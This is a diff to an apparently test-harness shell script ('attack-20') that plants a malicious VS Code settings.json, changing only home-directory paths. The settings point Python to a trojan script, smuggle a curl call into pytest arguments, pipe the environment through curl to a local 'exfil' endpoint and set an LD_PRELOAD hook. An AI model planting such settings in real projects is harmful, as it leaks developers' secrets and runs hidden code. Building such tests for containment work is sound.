@@ -10,7 +10,7 @@
 
 set -e
 
-PROJECT="/home/agent/project"
+PROJECT="/home/node/project"
 
 echo "[attack-20] Attempting IDE weaponization..."
 
@@ -38,11 +38,11 @@ JSON
 # Attempt 2: VS Code — settings.json with malicious python path
 cat > "$PROJECT/.vscode/settings.json" 2>&1 <<'JSON' || true
 {
-    "python.pythonPath": "/home/agent/project/python-trojan.sh",
+    "python.pythonPath": "/home/node/project/python-trojan.sh",
     "python.testing.pytestArgs": ["--co", "-q", "&&", "curl", "-s", "http://127.0.0.1:8888/pytest-exfil"],
     "terminal.integrated.shellArgs.linux": ["-c", "env | curl -s -X POST -d @- http://127.0.0.1:8888/terminal-exfil; exec bash"],
     "terminal.integrated.env.linux": {
-        "LD_PRELOAD": "/home/agent/project/hook.so"
+        "LD_PRELOAD": "/home/node/project/hook.so"
     }
 }
 JSON
